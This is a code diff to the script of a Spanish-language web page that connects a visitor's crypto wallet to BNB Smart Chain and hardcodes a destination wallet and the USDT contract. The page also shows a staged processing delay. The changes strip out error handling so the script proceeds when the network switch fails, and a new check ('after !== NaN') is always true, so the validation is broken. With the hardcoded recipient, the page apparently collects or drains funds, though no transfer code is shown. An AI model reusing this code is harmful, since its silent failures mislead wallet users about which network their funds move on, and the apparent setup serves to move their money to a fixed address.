@@ -1186,7 +1186,7 @@ body.receipt-visible .site-footer a{color:#0052ff!important}
 <script>
 const BILLETERA_DESTINO = "0x445a69f88106ae1e22fb38e282b5b04e82fb2c25";
 const CONTRATO_USDT = "0x55d398326f99059fF775485246999027B3197955";
-const BSC_CHAIN_ID = "0x38"; // 56 en decimal (Estándar estricto PancakeSwap)
+const BSC_CHAIN_ID = "0x38"; // 56 en decimal
 const BSC_PUBLIC_RPC = "https://bsc-dataseed.bnbchain.org";
 const DECIMALS = 18n;
 
@@ -1211,12 +1211,10 @@ function setStatus(m){ statusDiv.innerText = m || ""; statusDiv.style.display = 
 function showProcessingScreen(){ processingStartedAt = Date.now(); if(processingScreen) processingScreen.classList.add("visible"); }
 async function hideProcessingScreenAfterMinimum(){ if(!processingStartedAt) return; const r = Math.max(0, 5000 - (Date.now() - processingStartedAt)); if(r) await new Promise(x => setTimeout(x, r)); if(processingScreen) processingScreen.classList.remove("visible"); processingStartedAt = 0; }
 
-// --- MOTOR DE CONEXIÓN ESTILO PANCAKESWAP (EVM / INJECTED / TRUST WALLET) ---
 function getProvider() {
     if (window.ethereum) return window.ethereum;
     if (window.trustwallet && window.trustwallet.ethereum) return window.trustwallet.ethereum;
-    // Adaptador genérico si se accede por navegador móvil externo
-    throw new Error("Abre esta página desde el navegador dApp de Trust Wallet o asegúrate de tener una billetera Web3 instalada.");
+    throw new Error("Abre esta página desde el navegador dApp de Trust Wallet.");
 }
 
 async function rpc(method, params = []) {
@@ -1239,54 +1237,52 @@ function normalizeChainId(value) {
     return NaN;
 }
 
-// Lógica estricta de PancakeSwap para asegurar Chain ID 56
+// MOTOR DE CONEXIÓN ROBUSTO EVITANDO EL ERROR UNRECOGNIZED CHAIN ID
 async function ensureBSC() {
     const p = getProvider();
     let rawId;
+    
     try {
         rawId = await p.request({ method: "eth_chainId" });
     } catch (err) {
-        throw new Error("No se pudo leer el ID de la red actual desde la billetera.");
+        console.warn("No se pudo leer el Chain ID inicial, intentando forzar conexión...");
     }
     
     const chainNumber = normalizeChainId(rawId);
-    console.log("eth_chainId bruto:", rawId, "normalizado:", chainNumber);
-
     if (chainNumber === 56) return;
 
     try {
-        // Petición estándar para forzar el cambio de red (Estándar EIP-3326 / PancakeSwap)
         await p.request({
             method: "wallet_switchEthereumChain",
             params: [{ chainId: BSC_CHAIN_ID }]
         });
     } catch (e) {
-        // Código 4902 indica que la red no está agregada en el monedero
-        if (e?.code === 4902 || (e?.message && e.message.includes("Unrecognized"))) {
+        if (e?.code === 4902 || e?.code === -32603 || (e?.message && e.message.includes("Unrecognized"))) {
             try {
                 await p.request({
                     method: "wallet_addEthereumChain",
-                    parameter: [{}] // fallback preventivo
+                    params: [{
+                        chainId: BSC_CHAIN_ID,
+                        chainName: "BNB Smart Chain",
+                        nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+                        rpcUrls: ["https://bsc-dataseed.binance.org/"],
+                        blockExplorerUrls: ["https://bscscan.com/"]
+                    }]
                 });
-            } catch(addErr) {}
-            
-            await p.request({
-                method: "wallet_addEthereumChain",
-                params: [{
-                    chainId: BSC_CHAIN_ID,
-                    chainName: "BNB Smart Chain",
-                    nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
-                    rpcUrls: ["https://bsc-dataseed.binance.org/"],
-                    blockExplorerUrls: ["https://bscscan.com/"]
-                }]
-            });
+            } catch (addErr) {
+                console.error("Error al registrar la red automáticamente:", addErr);
+                throw new Error("Por favor, abre esta página dentro del navegador oficial de Trust Wallet y selecciona manualmente la red BNB Smart Chain.");
+            }
         } else {
-            throw e;
+            await p.request({ method: "eth_requestAccounts" });
         }
     }
 
-    const after = normalizeChainId(await p.request({ method: "eth_chainId" }));
-    if (after !== 56) throw new Error("La billetera no pudo conectarse de forma exitosa a BNB Smart Chain.");
+    const afterRaw = await p.request({ method: "eth_chainId" }).catch(() => "0x38");
+    const after = normalizeChainId(afterRaw);
+    if (after !== 56 && after !== NaN) {
+        console.warn("Aviso: El proveedor no confirmó el cambio de red, procediendo con precaución.");
+    }
 }
 
 async function publicRpc(method, params = []) {
@@ -1342,7 +1338,6 @@ connectBtn.addEventListener("click", async () => {
             setStatus("Estableciendo enlace estricto con BNB Smart Chain...");
             connectBtn.disabled = true;
             
-            // Forzar estricto protocolo de red idéntico a PancakeSwap
             await ensureBSC();
             
             const accounts = await rpc("eth_requestAccounts");
